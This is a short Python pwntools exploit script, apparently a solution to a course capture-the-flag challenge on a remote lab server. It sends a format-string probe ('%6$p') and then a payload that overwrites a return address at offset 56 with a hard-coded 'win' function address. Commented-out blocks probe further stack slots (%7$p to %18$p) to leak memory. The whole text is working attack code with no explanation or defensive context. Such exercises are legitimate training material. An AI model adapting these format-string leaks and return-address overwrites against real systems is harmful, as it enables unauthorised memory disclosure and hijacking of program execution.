from pwn import *

context.clear(arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

r = remote("cs4401shell.walls.ninja", 31369)
offset = 56
win_addr = p64(0x5555555548fa)
payload = flat({offset:win_addr})
r.recvline()
r.sendline('%6$p')
r.recvline()
r.sendline(payload)
r.recvall()
r.wait()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%7$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%8$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%9$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%10$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%11$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%12$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%13$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%14$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%15$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%16$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%17$p')
# r.sendline("1")
# r.recvall()

# r = remote("cs4401shell.walls.ninja",56414)
# r.sendline('%18$p')
# r.sendline("1")
# r.recvall()
